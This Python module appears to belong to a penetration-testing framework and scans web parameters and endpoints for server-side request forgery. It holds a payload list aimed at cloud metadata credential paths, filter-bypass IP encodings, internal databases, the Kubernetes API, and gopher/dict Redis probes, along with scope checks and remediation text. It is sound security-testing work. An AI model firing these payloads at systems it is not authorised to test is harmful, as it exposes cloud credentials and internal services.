"""SSRF scanner — detect Server-Side Request Forgery in URL-accepting parameters."""
from __future__ import annotations

import asyncio
import re
import sys
import time
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

CVSS_SSRF      = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N"
CVSS_SSRF_BLIND = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N"

# Cloud metadata endpoints (common SSRF targets)
SSRF_TARGETS = {
    # Cloud metadata — standard paths
    "AWS IMDS v1":       "http://169.254.169.254/latest/meta-data/",
    "AWS IMDS v1 creds": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "AWS IMDS v2":       "http://169.254.169.254/latest/meta-data/",  # probed with token header
    "GCP Metadata":      "http://metadata.google.internal/computeMetadata/v1/",
    "GCP Metadata alt":  "http://169.254.169.254/computeMetadata/v1/",
    "Azure IMDS":        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "DigitalOcean":      "http://169.254.169.254/metadata/v1/",
    "Oracle Cloud":      "http://169.254.169.254/opc/v1/instance/",
    # IPv6 / bypass representations of 169.254.169.254
    "IMDS IPv6 mapped":  "http://[::ffff:169.254.169.254]/latest/meta-data/",
    "IMDS decimal":      "http://2852039166/latest/meta-data/",      # 169.254.169.254 decimal
    "IMDS hex":          "http://0xa9fea9fe/latest/meta-data/",       # hex
    "IMDS octal":        "http://025177524776/latest/meta-data/",     # octal
    # Internal services
    "Localhost HTTP":    "http://localhost/",
    "Localhost IPv6":    "http://[::1]/",
    "Localhost 8080":    "http://localhost:8080/",
    "Localhost 8443":    "https://localhost:8443/",
    "Internal Redis":    "http://localhost:6379/",
    "Internal Postgres": "http://localhost:5432/",
    "Internal Mongo":    "http://localhost:27017/",
    "Internal Elastic":  "http://localhost:9200/",
    "Internal k8s API":  "https://kubernetes.default.svc/api/",
    # Gopher/dict for SSRF-to-RCE chains (Redis/Memcached via gopher)
    "Gopher Redis PING":  "gopher://localhost:6379/_PING%0D%0A",
    "Dict Redis":         "dict://localhost:6379/info",
}

CLOUD_INDICATORS = {
    "AWS IMDS v1":       ["ami-id", "instance-id", "local-ipv4", "iam"],
    "AWS IMDS v1 creds": ["ami-id", "instance-id", "local-ipv4", "iam"],
    "AWS IMDS v2":       ["ami-id", "instance-id", "AccessKeyId"],
    "GCP Metadata":      ["project-id", "instance", "zone", "google"],
    "GCP Metadata alt":  ["project-id", "instance", "zone"],
    "Azure IMDS":        ["subscriptionId", "resourceGroupName", "vmId"],
    "DigitalOcean":      ["droplet_id", "hostname", "vendor-data"],
    "Oracle Cloud":      ["shape", "compartmentId", "canonicalRegionName"],
    "IMDS IPv6 mapped":  ["ami-id", "instance-id"],
    "IMDS decimal":      ["ami-id", "instance-id"],
    "IMDS hex":          ["ami-id", "instance-id"],
    "IMDS octal":        ["ami-id", "instance-id"],
    "Localhost HTTP":    ["html", "HTTP", "server", "Welcome", "apache", "nginx"],
    "Localhost IPv6":    ["html", "HTTP", "server", "Welcome"],
    "Localhost 8080":    ["html", "HTTP", "server", "Welcome"],
    "Localhost 8443":    ["html", "HTTP", "server"],
    "Internal Redis":    ["+PONG", "redis_version", "-ERR", "CONFIG"],
    "Internal Postgres": ["PostgreSQL", "FATAL", "invalid"],
    "Internal Mongo":    ["ismaster", "MongoDB", "\"ok\""],
    "Internal Elastic":  ["cluster_name", "elasticsearch", "\"name\""],
    "Internal k8s API":  ["apiVersion", "kind", "kubernetes"],
    "Gopher Redis PING": ["+PONG", "redis"],
    "Dict Redis":        ["redis_version", "redis_mode"],
}

# URL parameters likely to trigger SSRF
URL_PARAMS = [
    "url", "uri", "link", "src", "source", "dest", "destination",
    "redirect", "next", "return", "returnUrl", "redirect_url",
    "callback", "webhook", "target", "fetch", "load",
    "import", "export", "file", "path", "resource",
    "feed", "api", "endpoint", "proxy",
]


class SsrfScanner(BaseModule):
    """SSRF vulnerability scanner."""

    NAME        = "ssrf_scanner"
    DESCRIPTION = "Detect SSRF in URL-accepting parameters via cloud metadata probing"
    PHASE       = 8
    TAGS        = ["file", "ssrf", "cwe-918", "owasp-a10"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        target = self.config.target.rstrip("/")
        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        # Find URL parameters from crawled pages
        test_targets: list[tuple[str, str]] = []
        crawled = self.config.extra.get("crawled_urls", [target])
        forms   = self.config.extra.get("found_forms", [])

        url_param_pattern = re.compile("|".join(URL_PARAMS), re.IGNORECASE)

        for url in crawled[:50]:
            if "?" in url:
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                for param in params:
                    if url_param_pattern.search(param):
                        test_targets.append((url, param))

        # Also probe common webhook/fetch endpoints
        for path in ["/webhook", "/fetch", "/proxy", "/api/fetch",
                     "/api/webhook", "/api/proxy", "/import"]:
            for param in ["url", "uri", "source"]:
                test_targets.append((f"{target}{path}?{param}=https://example.com", param))

        self.log.info("Testing %d URL parameter(s) for SSRF", len(test_targets))

        sem = asyncio.Semaphore(2)
        tasks = [self._test_ssrf(url, param, target, sem)
                 for url, param in test_targets[:30]]
        await asyncio.gather(*tasks, return_exceptions=True)

        return self._make_result(start)

    async def _test_ssrf(
        self, url: str, param_name: str, target: str, sem: asyncio.Semaphore
    ) -> None:
        async with sem:
            if not self.check_scope(url):
                return

            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)

            for ssrf_target_name, ssrf_url in SSRF_TARGETS.items():
                await self.rate_limit()
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param_name] = ssrf_url
                test_url = (
                    f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    f"?{urlencode(test_params)}"
                )

                try:
                    import aiohttp
                    # For AWS IMDSv2: include the token header — some SSRF
                    # implementations follow PUT→GET flows or pass headers through
                    extra_headers: dict[str, str] = {}
                    if "IMDS v2" in ssrf_target_name or "169.254.169.254" in ssrf_url:
                        extra_headers["X-aws-ec2-metadata-token"] = "test-token-bypass"
                        extra_headers["Metadata"] = "true"  # Azure IMDS also needs this
                    async with aiohttp.ClientSession(
                        connector=aiohttp.TCPConnector(ssl=False)
                    ) as session:
                        async with session.get(
                            test_url,
                            headers=extra_headers,
                            timeout=aiohttp.ClientTimeout(total=10),
                        ) as resp:
                            body = await resp.text(errors="ignore")

                    # Check if cloud metadata appeared in response
                    indicators = CLOUD_INDICATORS.get(ssrf_target_name, [])
                    if any(ind in body for ind in indicators):
                        severity = Severity.CRITICAL
                        ev = Evidence(
                            request_raw=f"GET {test_url}",
                            response_raw=body[:500],
                            extra={
                                "param":          param_name,
                                "ssrf_target":    ssrf_target_name,
                                "ssrf_url":       ssrf_url,
                                "indicators_hit": [i for i in indicators if i in body],
                            },
                        )
                        ev.screenshot_path = await self.capture_screenshot(
                            test_url, finding_id=f"ssrf_{param_name}"
                        )
                        self.new_finding(
                            title=f"SSRF — {ssrf_target_name} Data Leaked ({param_name})",
                            severity=severity,
                            description=(
                                f"SSRF confirmed in '{param_name}'. "
                                f"Server fetched {ssrf_url} and returned {ssrf_target_name} data. "
                                "An attacker can access internal services, cloud credentials, "
                                "and instance metadata."
                            ),
                            reproduction_steps=[
                                f"curl '{test_url}'",
                                f"Response contains: {indicators}",
                            ],
                            remediation=(
                                "Validate and allowlist URLs before fetching. "
                                "Block access to internal/RFC-1918/link-local addresses. "
                                "Use SSRF-safe HTTP clients that reject internal requests. "
                                "Enable IMDSv2 on AWS (requires token header — v1 won't work from SSRF)."
                            ),
                            references=["CWE-918", "OWASP A10:2021"],
                            evidence=ev,
                            cvss_v31_vector=CVSS_SSRF,
                            mitre_attack=["TA0001/T1190"],
                            target=target,
                            url=url,
                        )
                        return

                except Exception:
                    pass

    async def _post_forms_for_ssrf(self, forms: list[dict], target: str) -> None:
        """Test form POST endpoints for SSRF via URL parameters."""
        for form in forms[:10]:
            for input_name in form.get("inputs", []):
                if re.search("|".join(URL_PARAMS), input_name, re.IGNORECASE):
                    action = form.get("action", target)
                    for ssrf_url in list(SSRF_TARGETS.values())[:2]:
                        await self.rate_limit()
                        data = {i: "test" for i in form.get("inputs", [])}
                        data[input_name] = ssrf_url
                        try:
                            import aiohttp
                            async with aiohttp.ClientSession(
                                connector=aiohttp.TCPConnector(ssl=False)
                            ) as session:
                                async with session.post(
                                    action, data=data,
                                    timeout=aiohttp.ClientTimeout(total=10),
                                ) as resp:
                                    body = await resp.text(errors="ignore")
                            for name, indicators in CLOUD_INDICATORS.items():
                                if any(i in body for i in indicators):
                                    self.log.warning("SSRF in POST form: %s=%s", input_name, ssrf_url)
                        except Exception:
                            pass


class TestSsrfScanner:
    def test_ssrf_targets_not_empty(self) -> None:
        assert len(SSRF_TARGETS) >= 5

    def test_url_params_not_empty(self) -> None:
        assert "url" in URL_PARAMS
        assert "redirect" in URL_PARAMS

    def test_aws_imds_url(self) -> None:
        assert "169.254.169.254" in SSRF_TARGETS.get("AWS IMDS v1", "")
